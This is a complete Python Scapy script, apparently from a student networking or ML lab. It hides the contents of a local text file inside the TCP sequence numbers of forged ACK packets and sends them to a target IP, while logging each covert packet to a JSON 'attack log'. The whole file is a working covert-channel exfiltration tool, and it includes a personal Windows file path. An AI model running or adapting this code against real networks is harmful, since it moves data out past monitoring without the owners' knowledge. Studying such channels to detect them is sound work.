from scapy.all import IP, TCP, send, RandShort
import time
import json
from datetime import datetime
import random

def random_isn():
    return random.getrandbits(32)

isn = random_isn()
# -------------------------
# Convert 4 characters -> 32-bit sequence number
# -------------------------
def chars_to_seq(chars):
    chars = chars.ljust(4)[:4]            # pad or trim
    b = chars.encode('utf-8', errors='replace')
    return int.from_bytes(b, 'big')


# -------------------------
# Load file -> return list of (block, seq_num)
# -------------------------
def load_chunks(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        text = f.read()

    # pad text to multiple of 4
    while len(text) % 4 != 0:
        text += " "

    chunks = []
    for i in range(0, len(text), 4):
        block = text[i:i+4]
        num = chars_to_seq(block)
        chunks.append((block, num))

    return chunks


# -------------------------
# Send packets carrying covert data inside TCP sequence field
# -------------------------
def send_covert_chunks(chunks, src_ip, dst_ip, dport=80, inter=0.02):
    packets = []
    seq_base = 1000  # normal-looking ACK number baseline

    for index, (block, seq_num) in enumerate(chunks):
        orig_seq = (isn + index) & 0xFFFFFFFF
        new_seq = seq_num   # covert overwrite
        pkt = IP(src=src_ip, dst=dst_ip) / TCP(
            sport=44444,
            dport=dport,
            seq=new_seq,        # covert data hidden here
            flags="A",
            ack=orig_seq
        )

        packets.append(pkt)
        send(pkt, verbose=False)
        print(f"Sent block '{block}' as seq={seq_num}")
        bits = ''.join(f'{ord(c):08b}' for c in block)

        log_attack("Seq", orig_seq, new_seq, bits)
        pkt[TCP].seq = new_seq
        time.sleep(inter)

    return packets

ATTACK_LOG = "attack_log.json"

# Determine next packet_id based on existing attack_log.json (if any)
global_packet_id = 1
try:
    with open(ATTACK_LOG, "r") as f:
        content = f.read().strip()
        if content:
            data = json.loads(content)
            if isinstance(data, list) and len(data) > 0:
                max_id = max(e.get("packet_id", 0) for e in data)
                global_packet_id = max_id + 1
except (FileNotFoundError, json.JSONDecodeError):
    global_packet_id = 1

def log_attack(field, original, modified, bits):
    global global_packet_id

    entry = {
        "packet_id": global_packet_id,
        "modified_field": field,
        "original_value": original,
        "modified_value": modified,
        "covert_bits": bits,
        "timestamp": datetime.now().timestamp()
    }

    try:
        with open(ATTACK_LOG, "r") as f:
            content = f.read().strip()
            if content:
                data = json.loads(content)
            else:
                data = []
    except (FileNotFoundError, json.JSONDecodeError):
        data = []

    data.append(entry)

    with open(ATTACK_LOG, "w") as f:
        json.dump(data, f, indent=4)

    global_packet_id += 1

if __name__ == "__main__":
    file_path =  "C:/Users/Nikitha/Downloads/5th_sem/aiml_dbms_lab/sample_text.txt"    # your text file
    src_ip = "198.168.1.6"
    dst_ip = "198.168.1.6"
    dport = 9999                   # any port (not used for real)

    chunks = load_chunks(file_path)
    print(f"Loaded {len(chunks)} blocks.")

    send_covert_chunks(chunks, src_ip, dst_ip, dport)
   
